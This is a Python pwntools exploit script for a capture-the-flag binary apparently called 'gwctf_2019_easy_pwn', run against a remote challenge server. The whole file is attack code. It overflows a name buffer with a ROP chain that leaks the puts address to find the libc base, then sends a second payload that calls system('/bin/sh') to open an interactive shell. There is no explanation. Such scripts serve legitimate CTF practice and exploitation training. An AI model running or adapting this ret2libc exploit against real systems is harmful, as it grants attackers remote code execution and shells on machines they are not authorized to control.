from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('gwctf_2019_easy_pwn')
io = remote('node4.buuoj.cn', 26438)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('gwctf_2019_easy_pwn')
main = 0x080492F5
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = b'I' * 0x10 + p32(puts_plt) + p32(main) + p32(puts_got)
io.sendlineafter('Hello,please tell me your name!\n', payload)
io.recvline()
libc_base = u32(io.recvn(4)) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
payload = b'I' * 0x10 + p32(system) + cyclic(4) + p32(bin_sh)
io.sendafter('Hello,please tell me your name!\n', payload)
io.interactive()
